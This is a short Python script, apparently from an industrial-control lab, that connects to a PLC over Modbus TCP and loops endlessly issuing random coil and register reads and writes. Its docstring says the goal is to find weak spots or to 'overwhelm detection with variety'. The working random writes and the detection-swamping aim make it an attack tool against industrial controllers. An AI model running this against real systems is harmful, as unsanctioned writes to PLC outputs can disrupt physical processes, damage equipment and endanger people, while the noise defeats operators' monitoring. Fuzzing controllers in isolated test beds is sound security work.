#!/usr/bin/env python
"""
fuzz_modbus.py

Randomly exercises Modbus function codes against the PLC to uncover weak spots
or simply overwhelm detection with variety.
"""

import time, random
from pymodbus.client import ModbusTcpClient

PLC_HOST = "192.168.64.1"
PLC_PORT = 502
PLC_UNIT = 1

def main():
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    if not client.connect():
        print(f"ERROR: Cannot connect to {PLC_HOST}:{PLC_PORT}")
        return

    print("Starting Modbus fuzzer (random reads/writes)...")
    funcs = [
        lambda: client.read_coils(address=random.randint(0,10), count=random.randint(1,5), slave=PLC_UNIT),
        lambda: client.read_discrete_inputs(address=random.randint(0,10), count=random.randint(1,5), slave=PLC_UNIT),
        lambda: client.read_holding_registers(address=random.randint(0,10), count=random.randint(1,5), slave=PLC_UNIT),
        lambda: client.read_input_registers(address=random.randint(0,10), count=random.randint(1,5), slave=PLC_UNIT),
        lambda: client.write_coil(address=random.randint(0,10), value=random.choice([True,False]), slave=PLC_UNIT),
        lambda: client.write_register(address=random.randint(0,10), value=random.randint(0,65535), slave=PLC_UNIT),
        lambda: client.write_coils(address=random.randint(0,10),
                                   values=[random.choice([True,False]) for _ in range(random.randint(1,5))],
                                   slave=PLC_UNIT),
        lambda: client.write_registers(address=random.randint(0,10),
                                       values=[random.randint(0,65535) for _ in range(random.randint(1,5))],
                                       slave=PLC_UNIT),
    ]

    try:
        while True:
            func = random.choice(funcs)
            rr = func()
            print(f"[FUZZ] {rr}")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nFuzzing stopped.")
    finally:
        client.close()

if __name__ == "__main__":
    main()
